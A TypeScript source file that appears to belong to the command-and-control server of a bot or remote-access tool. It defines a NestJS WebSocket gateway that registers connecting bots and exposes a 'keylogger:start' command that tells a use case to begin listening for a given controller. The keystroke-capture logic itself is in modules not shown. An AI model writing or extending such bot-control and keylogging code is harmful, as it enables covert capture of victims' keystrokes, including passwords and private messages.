import {
  OnGatewayConnection,
  OnGatewayDisconnect,
  SubscribeMessage,
  WebSocketGateway,
} from "@nestjs/websockets";
import { Socket } from "socket.io";
import { WsBotRepository } from "../domain/ws-bot.repository";
import { WsBotJoinsUseCase } from "../application/ws-bot-joins.use-case";
import { WsBotLeavesUseCase } from "../application/ws-bot-leaves.use-case";
import { WsBotKeyLoggerUseCase } from "../application/events/ws-bot-keylogger.use-case";
import type { WsBotKeyLoggerStart } from "../application/events/ws-bot-events.types";

@WebSocketGateway({
  namespace: "bot",
  cors: true,
  maxHttpBufferSize: 1e8,
})
export class WsBotGateway implements OnGatewayConnection, OnGatewayDisconnect {
  constructor(
    private readonly wsBotJoinsUseCase: WsBotJoinsUseCase,
    private readonly wsBotLeavesUseCase: WsBotLeavesUseCase,
    private readonly wsBotKeyLoggerUseCase: WsBotKeyLoggerUseCase,
  ) {}

  afterInit(client: Socket) {}

  async handleConnection(client: Socket) {
    try {
      return this.wsBotJoinsUseCase.execute(client);
      // await this.clientJoinsUseCase.execute()
    } catch (error) {
      // console.error("Connection error:", error);
      client.disconnect();
    }
  }

  handleDisconnect(client: Socket) {
    this.wsBotLeavesUseCase.execute();
  }

  @SubscribeMessage("keylogger:start")
  async startKeyLogger(data: WsBotKeyLoggerStart) {
    this.wsBotKeyLoggerUseCase.startListening(data.controllerid);
    console.log("Keylogger start", data);
  }
}
